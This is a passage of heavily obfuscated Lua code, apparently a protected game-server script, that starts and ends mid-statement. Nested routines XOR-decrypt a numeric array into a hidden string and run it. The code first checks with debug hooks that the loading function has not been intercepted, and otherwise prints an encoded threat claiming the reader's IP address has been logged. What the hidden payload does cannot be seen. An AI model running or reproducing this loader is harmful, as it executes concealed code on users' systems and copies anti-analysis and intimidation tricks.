      [vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('BF') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('B2') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('CC') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('41') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('00') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('5B')]
      [vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('8F') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('4E') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('A9') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('CC')](
      q) end
    ; n(gDnSD64QR4lCHM1PTIMLdnxADu9cVx9nNrVOjHtEGkAKWIQJuu9oOQ07biHKt)
  end; bEdmjJ2DIMfUsfU0x9t4KKWDVENtR550RDy3XgFDLucZI76QTcMi6wQi(f,
    function(r) k03rhjgknqyxMgVO0pqAJjrmHAmK7HAZOxCTiYjwchpXBXLvegTiW7loOKiXrIhJtZBWFOOT(r, g,
        function(s) e6qrO4U2nWAPwSgRbgM3EF6XZyJIcyeZ9nuwG6SFFARbOeJAgGy06iMqK(s,
            function(t) if #h2lNMGQ4HMohXuEDuVmY92D3SEtICR7rSq2XhNjkSyg0wbHR1dRN2(gfcFohfiZ1LrP2kKBDOmCvbFw7hPOu8aFttRWPuEMrUNzJ6ZIRArADnC[vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('1A') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('F3') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('A9') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('82')]) == 1 then if gfcFohfiZ1LrP2kKBDOmCvbFw7hPOu8aFttRWPuEMrUNzJ6ZIRArADnC[vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('1A') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('F3') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('A9') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('82')] == gfcFohfiZ1LrP2kKBDOmCvbFw7hPOu8aFttRWPuEMrUNzJ6ZIRArADnC[vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('E6') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('CC') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('41') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('00') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('B2')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if gfcFohfiZ1LrP2kKBDOmCvbFw7hPOu8aFttRWPuEMrUNzJ6ZIRArADnC[vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('1A') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('F3') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('A9') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('82')](t) then
                    gfcFohfiZ1LrP2kKBDOmCvbFw7hPOu8aFttRWPuEMrUNzJ6ZIRArADnC
                        [vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('1A') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('F3') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('A9') .. vEBIhjBgmvA4K9K2AeSnOrmZIyXXA6RJsLtmtubWYB7byc3ZqfDELphWcR23Df5yHJY9f1oMhtk('82')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; i4D6ovSjljJjN7O3eAcCnWqoe5yVLVlUyohiRXedHg1I3WbvxpBHHmOEn9hMgPAScIDGUuG(
{ 840, 1033, 1154, 1197, 874, 833, 925, 563, 1162, 571, 1096, 780, 895, 810, 670, 779, 1191, 1125, 1142, 976, 837, 661,
  1158, 1202, 908, 784, 1165, 1064, 1145, 873, 1114, 1071, 654, 1151, 721, 1006, 1018, 831, 1081, 1044, 1008, 1049, 631,
  792, 862, 1102, 628, 637, 552, 1139, 618, 832, 1164, 614, 905, 653, 590, 723, 803, 1157, 1066, 930, 1120, 562, 1107,
  1147, 753, 746, 764, 1010, 1068, 667, 842, 1085, 772, 1181, 1196, 857, 1092, 1094, 557, 906, 888, 887, 865, 997, 728,
  1115, 1138, 696, 659, 717, 582, 669, 903, 817, 1005, 550, 1020, 947, 586, 544, 973, 863, 548, 545, 692, 1201, 567,
  1007, 929, 904, 847, 1045, 1137, 1174, 806, 706, 1030, 593, 1212, 1035, 1143, 907, 1028, 649, 948, 1041, 852, 644, 878,
  914, 1090, 816, 797, 979, 767, 662, 673, 658, 861, 665, 824, 573, 970, 868, 720, 549, 901, 1124, 978, 716, 1127, 1012,
  588, 1161, 1208, 660, 1040, 648, 975, 758, 969, 598, 953, 967, 687, 729, 782, 1084, 805, 825, 956, 639, 710, 1179, 855,
  757, 1178, 958, 1063, 1185, 578, 962, 1042, 770, 719, 707, 923, 1192, 594, 866, 848, 829, 813, 1087, 1053, 938, 1000,
  583, 1093, 931, 893, 944, 1034, 1011, 1140, 954, 877, 636, 603, 1183, 1079, 1029, 1148, 551, 889, 864, 1014, 910, 778,
  664, 1136, 777, 1031, 1106, 794, 1126, 1182, 1173, 836, 1075, 984, 1052, 1074, 1111, 774, 1057, 656, 725, 1101, 968,
  1150, 1189, 655, 814, 1078, 619, 735, 920, 570, 896, 668, 743, 1200, 599, 1059, 674, 711, 769, 1019, 846, 1056, 963,
  890, 1121, 853, 762, 709, 1146, 1117, 915, 766, 677, 841, 972, 1027, 1195, 676, 1134, 741, 1159, 913, 556, 547, 690,
  1123, 911, 916, 1132, 612, 820, 645, 703, 756, 585, 1206, 880, 581, 981, 699, 1097, 751, 555, 1072, 754, 651, 869, 922,
  629, 789, 652, 795, 622, 678, 791, 1003, 1170, 1199, 714, 961, 700, 587, 994, 992, 732, 966, 844, 894, 543, 744, 1024,
  642, 854, 1210, 819, 987, 685, 1088, 839, 1116, 1153, 1050, 657, 918, 798, 935, 635, 1051, 1113, 821, 1022, 666, 800,
  689, 739, 1104, 705, 952, 554, 867, 871, 731, 1190, 672, 835, 799, 899, 713, 838, 646, 1015, 546, 734, 1108, 939, 990,
  1110, 1109, 686, 1098, 959, 1069, 1166, 704, 933, 641, 1167, 1160, 949, 809, 559, 986, 609, 1076, 640, 643, 926, 634,
  1039, 768, 561, 693, 955, 615, 812, 647, 1163, 560, 830, 624, 785, 625, 572, 1058, 601, 1100, 745, 574, 1054, 796, 683,
  722, 663, 850, 702, 1103, 597, 1001, 787, 999, 886, 1187, 902, 1047, 1080, 630, 1091, 752, 695, 596, 1099, 980, 804,
  575, 736, 942, 761, 605, 790, 1032, 580, 1119, 1204, 989, 1184, 1207, 633, 1171, 611, 1017, 783, 998, 1002, 1188, 763,
  802, 1026, 822, 776, 569, 1168, 708, 856, 1133, 924, 1083, 1198, 996, 1070, 859, 983, 730, 1086, 898, 688, 883, 701,
  712, 765, 1009, 974, 815, 1129, 760, 602, 845, 697, 1038, 1043, 606, 960, 1194, 1112, 1176, 1025, 627, 1144, 589, 818,
  740, 1186, 675, 1130, 934, 564, 941, 610, 991, 882, 1067, 698, 1180, 755, 1209, 900, 1055, 917, 568, 1177, 1082, 1172,
  985, 608, 872, 750, 826, 1155, 775, 680, 759, 1128, -1, 70, 67, 34, 98, 97, 86, 21, 111, 115, 45, 61, 122, 5, 23, 51,
  105, 49, 17, 63, 107, 57, 62, 102, 184, 69, 101, 96, 28, 0, 74, 42, 105, 105, 170, 1, 81, 152, 90, 31, 76, 65, 49, 90,
  56, 50, 99, 29, 23, 36, 68, 21, 119, 8, 42, 107, 115, 63, 207, 11, 101, 101, 195, 51, 122, 172, 118, 3, 74, 18, 1, 25,
  48, 28, 27, 60, 111, 46, 58, 244, 101, 143, 102, 96, 82, 19, 99, 6, 100, 19, 136, 13, 54, 17, 98, 54, 171, 84, 58, 48,
  100, 52, 101, 120, 125, 71, 93, 80, 130, 43, 29, 18, 54, 113, 0, 39, 84, 95, 112, 60, 116, 116, 80, 37, 81, 44, 31, 73,
  0, 193, 18, 52, 6, 81, 28, 40, 61, 70, 45, 154, 63, 115, 122, 6, 65, 96, 8, 19, 31, 151, 32, 9, 145, 7, 39, 31, 101,
  23, 17, 66, 84, 116, 34, 104, 51, 116, 69, 109, 94, 44, 100, 69, 116, 162, 107, 122, 115, 73, 65, 98, 122, 50, 249, 34,
  185, 60, 39, 127, 81, 44, 40, 67, 84, 1, 2, 132, 243, 70, 82, 107, 68, 33, 89, 79, 18, 7, 7, 228, 70, 93, 45, 24, 33,
  20, 108, 105, 102, 42, 86, 33, 57, 26, 19, 122, 70, 118, 43, 26, 86, 126, 101, 95, 57, 115, 108, 65, 92, 20, 59, 160,
  20, 45, 27, 116, 107, 122, 188, 61, 58, 20, 5, 233, 41, 90, 69, 69, 32, 105, 65, 212, 59, 57, 107, 86, 65, 45, 86, 2,
  63, 165, 0, 1, 35, 111, 3, 74, 14, 67, 110, 19, 94, 131, 19, 80, 20, 48, 216, 108, 96, 98, 22, 60, 37, 32, 45, 100,
  116, 101, 124, 20, 33, 28, 72, 44, 44, 39, 127, 210, 98, 36, 43, 53, 122, 99, 115, 72, 190, 19, 12, 58, 27, 0, 93, 122,
  83, 98, 8, 52, 84, 67, 81, 89, 3, 155, 123, 78, 124, 131, 61, 228, 79, 29, 71, 121, 14, 60, 11, 63, 75, 81, 31, 118,
  57, 97, 73, 37, 86, 76, 55, 81, 3, 20, 49, 105, 81, 111, 44, 220, 47, 53, 72, 39, 35, 40, 118, 116, 122, 104, 91, 99,
  106, 105, 116, 40, 116, 6, 39, 40, 26, 112, 4, 53, 43, 42, 89, 145, 70, 107, 82, 39, 17, 172, 125, 53, 144, 54, 39, 10,
  6, 140, 100, 110, 92, 61, 10, 130, 82, 70, 116, 42, 119, 22, 10, 246, 2, 83, 49, 108, 16, 35, 7, 33, 67, 66, 117, 158,
  99, 56, 88, 122, 231, 122, 34, 20, 44, 111, 238, 82, 19, 69, 86, 208, 47, 199, 115, 38, 54, 18, 31, 19, 96, 29, 179,
  89, 23, 53, 81, 98, 5, 68, 68, 42, 115, 94, 142, 13, 49, 4, 52, 168, 122, 49, 104, 107, 10, 90, 109, 98, 1, 19, 37, 21,
  110, 91, 47, 240, 1, 17, 110, 13, 112, 89, 122, 84, 155, 89, 36, 65, 29, 61, 39, 73, 81, 118, 39, 35, 111, 49, 217, 2,
  235, 104, 42, 41, 43, 86, 22, 89, 107, 33, 13, 247, 2, 17, 69, 144, 71, 86, 117, 57, 22, 98, 118, 101, 65, 105, 16, 68,
  38, 57, 6, 72, 41, 56, 39, 20, 19, 79, 25, 47, 96, 115, 89, 202, 70, 71, 115, 81, 122, 49, 84, 65, 16, 7, 61, 54, 88,
  48, 52, 48, 114, 30, 51, 21, 45, 118, 62, 79, 43, 161, 24, 122, 59, 20, 81, 32, 54, 15, 125, 196, 89, 81, 122, 39, 7,
  50, 104, 148, 49, 120, 67, 20, 44, 79, 152, 63, 55, 61, 35, 72, 10, 5, 86, 31, 104, 67, 123, 248, 39, 86, 31, 60, 40,
  107, 115, 51, 122, 100, 105, 79, 54, 86, 40, 67, 2, 87, 32, 92, 0, 86, 108, 55, 98, 10, 111, 3, 84, 118, 40, 23, 13,
  175, 35, 151, 115, 89, 68, 11, 98, 120, 19 }, "vEIqeSZTBtSK3Zqa3fyHDZBcOo"); iB8nExkZiS2LBF0fFVNnoFJxtvTgR8g3rDtGweipyWP76iyfIG4047NeEnBYGgmMPGTLfXB37U8 =
gfcFohfiZ1LrP2kKBDOmCvbFw7hPOu8aFttRWPuEMrUNzJ6ZIRArADnC; c7gdJo4WV9oL3w8QIePWuGLqLE7HfX2XSHivXHtSUaLe1BP5AySW8xf2dr59mQ7nBGXMFYDp =
gfcFohfiZ1LrP2kKBDOmCvbFw7hPOu8aFttRWPuEMrUNzJ6ZIRArADnC; dG1TuLH30r0f3eeg62n9IsQ72nH4fqWTipCYeJGBuCdHnVZ3MvUqPEIj =
c7gdJo4WV9oL3w8QIePWuGLqLE7HfX2XSHivXHtSUaLe1BP5AySW8xf2dr59mQ7nBGXMFYDp; pLsZxhaLv91k5O3Run8AZVGMHc6oZ3hMwsnjaoppooGHfF2A42v05Odnz =
dG1TuLH30r0f3eeg62n9IsQ72nH4fqWTipCYeJGBuCdHnVZ3MvUqPEIj; yhREOizgoC7XVKNoxGW8SBMxGXgXyroViV8U88c6pIIfRpUuJdCzA5jE8Uirs6i3OQuG =
pLsZxhaLv91k5O3Run8AZVGMHc6oZ3hMwsnjaoppooGHfF2A42v05Odnz; c4IEkOryVQUnn9Kx58robpHZZr5HbnZ8DJbPpJrQJQE8jDtZiKT0KobmISfxvrrXhFAJ1aK75Ec =
yhREOizgoC7XVKNoxGW8SBMxGXgXyroViV8U88c6pIIfRpUuJdCzA5jE8Uirs6i3OQuG; r9xLhhpyGKMhpNoJd4GZ3AtbjseuFNosveNvQWDhjpIn4JxYaG6R1fh7xph0NIoFM9e =
c4IEkOryVQUnn9Kx58robpHZZr5HbnZ8DJbPpJrQJQE8jDtZiKT0KobmISfxvrrXhFAJ1aK75Ec; nfAB32FQxhBk43bFp80iixjiwRSrkD6dMINUPsEPtqCn7CHb9edyxcyTuo1H49w8ilgLs4m2EEU =
r9xLhhpyGKMhpNoJd4GZ3AtbjseuFNosveNvQWDhjpIn4JxYaG6R1fh7xph0NIoFM9e; oFN6GYd9VW8TLo7G8XCH8CIhDqZlLj21KmedrT8nfVjIt27SPwgmloOY =
nfAB32FQxhBk43bFp80iixjiwRSrkD6dMINUPsEPtqCn7CHb9edyxcyTuo1H49w8ilgLs4m2EEU; dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC = function(
  a)
  K, F = 3698186810865856, 16384 + 7318; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; eJ91cBg8ZEGvGlgMeLnX26ImZUsywrxdC2BNbXow3tlSyQo2WLOa3UWfLsDA = function(b)
  co = coroutine.create(b)
  lxVZBJvGwGiCb3GWepi49JFw0jhEwBmZDScBX3sgH5cq2g2ec3smlCJJc3 = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(lxVZBJvGwGiCb3GWepi49JFw0jhEwBmZDScBX3sgH5cq2g2ec3smlCJJc3, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return lxVZBJvGwGiCb3GWepi49JFw0jhEwBmZDScBX3sgH5cq2g2ec3smlCJJc3
end; hfsghtGPuWqn5hctGTWc6z0UgSY2Jay1Bq8aSs6giut9pRCsc69M6xldnrXIFO00lvHznDF9Yby = function(f, g)
  pHklo7ZLSNE9yI49mFWArNh12F9CNOaJfyDGFaMM9qxJrhtYRas0Ejt24cXNvUdkuAEp = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; dnlX6wr7TYDETEEsBsRAnpIT99iGSyLeER28o5I0NKechntD8PyxHZno = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; d0SSBzAYz4IjbOrbUrEokyOmty3lfK4donxEfK7fL4SI7FAk1aTHqaxCU = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      pHklo7ZLSNE9yI49mFWArNh12F9CNOaJfyDGFaMM9qxJrhtYRas0Ejt24cXNvUdkuAEp(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; hZmvRhtVtPWmS9vzUdLzXqxJXaSB1VNy6uoLqMWy0Phr7vTpK1RP3oyc7l22 = function(p, n)
    r2jSKf8TQvvwxJms2L4C9lIkY1WgIXrqsW3N599WGYsl8TuQchFj2G4imbCyBiTfCtd48UrP = ""
    for k, q in pairs(p) do r2jSKf8TQvvwxJms2L4C9lIkY1WgIXrqsW3N599WGYsl8TuQchFj2G4imbCyBiTfCtd48UrP =
      r2jSKf8TQvvwxJms2L4C9lIkY1WgIXrqsW3N599WGYsl8TuQchFj2G4imbCyBiTfCtd48UrP ..
      oFN6GYd9VW8TLo7G8XCH8CIhDqZlLj21KmedrT8nfVjIt27SPwgmloOY
      [dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('20') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('33') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('0D') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('62') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('C1') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('3C')]
      [dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('F0') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('4F') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('CA') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('0D')](
      q) end
    ; n(r2jSKf8TQvvwxJms2L4C9lIkY1WgIXrqsW3N599WGYsl8TuQchFj2G4imbCyBiTfCtd48UrP)
  end; dnlX6wr7TYDETEEsBsRAnpIT99iGSyLeER28o5I0NKechntD8PyxHZno(f,
    function(r) d0SSBzAYz4IjbOrbUrEokyOmty3lfK4donxEfK7fL4SI7FAk1aTHqaxCU(r, g,
        function(s) hZmvRhtVtPWmS9vzUdLzXqxJXaSB1VNy6uoLqMWy0Phr7vTpK1RP3oyc7l22(s,
            function(t) if #eJ91cBg8ZEGvGlgMeLnX26ImZUsywrxdC2BNbXow3tlSyQo2WLOa3UWfLsDA(oFN6GYd9VW8TLo7G8XCH8CIhDqZlLj21KmedrT8nfVjIt27SPwgmloOY[dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('9B') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('D4') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('CA') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('03')]) == 1 then if oFN6GYd9VW8TLo7G8XCH8CIhDqZlLj21KmedrT8nfVjIt27SPwgmloOY[dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('9B') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('D4') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('CA') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('03')] == oFN6GYd9VW8TLo7G8XCH8CIhDqZlLj21KmedrT8nfVjIt27SPwgmloOY[dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('E7') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('0D') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('62') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('C1') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('33')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if oFN6GYd9VW8TLo7G8XCH8CIhDqZlLj21KmedrT8nfVjIt27SPwgmloOY[dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('9B') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('D4') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('CA') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('03')](t) then
                    oFN6GYd9VW8TLo7G8XCH8CIhDqZlLj21KmedrT8nfVjIt27SPwgmloOY
                        [dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('9B') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('D4') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('CA') .. dJGticWtdlL3Af0K0L2bVzwVv3x2xgZhrMsSwTpmBF2ZoTPabtRB9P1sbybIafHnOBSOmC('03')](
                        t)() end end else print(
